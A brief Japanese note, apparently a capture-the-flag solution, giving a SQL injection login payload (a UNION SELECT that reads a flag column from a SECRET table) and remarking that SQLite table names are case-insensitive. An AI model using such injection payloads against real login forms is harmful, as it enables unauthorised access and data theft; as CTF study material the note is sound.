username: ' UNION SELECT flag, 'dummy' FROM SECRET --
password: anything

これで突破可能。

Sqlite3の仕様上、テーブル名では大文字と小文字が区別されないので、これでOK。